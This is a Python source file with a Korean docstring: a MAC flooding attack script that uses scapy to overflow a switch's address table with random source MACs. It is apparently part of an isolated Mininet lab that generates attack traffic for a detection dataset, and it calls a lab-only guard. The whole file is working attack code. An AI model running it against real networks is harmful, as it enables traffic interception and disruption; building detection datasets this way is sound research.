"""MAC 플러딩 (w07) — 격리 실험용.

출발지 MAC을 매번 다르게 바꾼 프레임을 스위치로 쏟아붓습니다.
스위치의 MAC 학습 표(CAM)를 가짜 MAC으로 가득 채워, 표가 넘치면 스위치가
모르는 목적지 프레임을 모든 포트로 흘려보내게(허브처럼) 만드는 공격입니다.

출발지 MAC 하나당 프레임이 1~2개뿐이라, MAC별 집계(feat_host)로는 잘 안 보이고
포트별 집계(feat_seg)의 new_src_macs / src_macs 로 드러납니다 — data-format.md 2.3 참고.

run.py가 Mininet 공격자 호스트 안에서 실행합니다.

    python env/attacks/mac_flood.py --iface h4-eth0 --rate 500 --duration 20
"""

from __future__ import annotations

import argparse
import random
import time

from env.attacks.labguard import require_lab


def random_mac() -> str:
    # 로컬 관리 비트 설정(x2), 멀티캐스트 비트 해제 → 유효한 유니캐스트 지역 MAC
    b = [0x02, random.randint(0, 255), random.randint(0, 255),
         random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)]
    return ":".join(f"{x:02x}" for x in b)


def run(iface: str, rate: float, duration: float) -> None:
    from scapy.all import Ether, sendp

    interval = 1.0 / rate if rate > 0 else 0.0
    end = time.time() + duration
    sent = 0
    # 목적지는 임의의 미등록 주소. 스위치가 학습하도록 출발지 MAC만 매번 바꿈.
    while time.time() < end:
        frame = Ether(src=random_mac(), dst=random_mac())
        sendp(frame, iface=iface, verbose=False)
        sent += 1
        if interval:
            time.sleep(interval)
    print(f"mac_flood 끝: {sent}개 전송 (iface={iface})")


def main() -> None:
    require_lab()
    p = argparse.ArgumentParser(description="MAC 플러딩 (격리 실험용)")
    p.add_argument("--iface", required=True)
    p.add_argument("--rate", type=float, default=500.0, help="초당 프레임 수")
    p.add_argument("--duration", type=float, default=20.0)
    a = p.parse_args()
    run(a.iface, a.rate, a.duration)


if __name__ == "__main__":
    main()
